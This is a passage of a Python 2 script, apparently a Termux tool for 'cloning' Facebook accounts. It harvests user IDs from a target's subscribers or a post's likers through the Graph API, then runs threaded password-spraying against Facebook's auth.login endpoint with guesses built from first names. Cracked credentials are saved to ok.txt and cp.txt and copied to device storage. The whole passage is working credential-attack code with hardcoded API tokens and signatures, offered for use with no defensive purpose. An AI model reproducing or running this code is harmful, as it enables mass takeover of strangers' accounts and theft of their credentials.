                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        randm()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID : ")
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
               pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        randm()

        elif select =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                randmm2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:
                    pass1=name+"123"
                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                    d=json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
                        cps.append(uid)
                    else:
                        if "access_token" in d:
                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass1+"\n")
                            ok.close()
                            oks.append(uid)
                        else:
                            pass2=name+"1234"
                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)
                                else:

                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                    d=json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass3+" \033[1;97m")
                                        cp=open("cp.txt","a")
                                        cp.write(uid+" | "+pass3+"\n")
                                        cp.close()
                                        cps.append(uid)
                                    else:
                                        if 'access_token' in d:
                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" \033[1;97m")
                                            ok=open("ok.txt","a")
                                            ok.write(uid+" | "+pass3+"\n")
                                            ok.close()
                                            oks.append(uid)
                                        else:

                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                            d=json.loads(q)
                                            if 'www.facebook.com' in d['error_msg']:
                                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass4+" \033[1;97m")
                                                cp=open("cp.txt","a")
                                                cp.write(uid+" | "+pass4+"\n")
                                                cp.close()
                                                cps.append(uid)
                                            else:
                                                if 'access_token' in d:
                                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" \033[1;97m")
                                                    ok=open("ok.txt","a")
                                                    ok.write(uid+" | "+pass4+"\n")
                                                    ok.close()
                                                    oks.append(uid)
                                                else:

                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                    d=json.loads(q)
                                                    if 'www.facebook.com' in d['error_msg']:
                                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass5+" \033[1;97m")
                                                        cp=open("cp.txt","a")
                                                        cp.write(uid+" | "+pass5+"\n")
                                                        cp.close()
                                                        cps.append(uid)
                                                    else:
                                                        if 'access_token' in d:
                                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" \033[1;97m")
                                                            ok=open("ok.txt","a")
                                                            ok.write(uid+" | "+pass5+"\n")
                                                            ok.close()
                                                            oks.append(uid)

                except:
                       pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[✓] File Downloaded Successfully')
        print("[✓] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Please Select a Valid Option ")
        down()
if __name__ == '__main__':
    tech_abm()